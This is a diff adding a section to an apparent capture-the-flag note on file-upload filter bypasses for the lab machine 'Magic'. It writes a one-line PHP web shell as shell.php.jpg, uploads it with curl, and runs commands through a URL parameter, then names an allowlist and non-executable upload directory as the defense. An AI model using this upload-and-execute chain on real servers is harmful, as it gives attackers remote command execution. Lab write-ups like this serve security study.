@@ -37,6 +37,18 @@ curl -s http://<HOST>/uploads/test.php5
 - Uppercase or trailing dot on Windows.
 - `.htaccess` mapping an extension.
 
+## Magic case: `.php.jpg`
+
+On Magic, the filter only checks the final extension and Apache still interprets the file through the `.php` handler:
+
+```bash
+printf '<?php system($_GET["c"]); ?>' > shell.php.jpg
+curl -s -b cookies.txt -F "image=@shell.php.jpg" http://magic.htb/upload.php
+curl "http://magic.htb/images/shell.php.jpg?c=id"
+```
+
+The correct defense is an extension allowlist and serving uploads from a non-executable directory.
+
 ## Limitations
 
 - The server must interpret the extension.
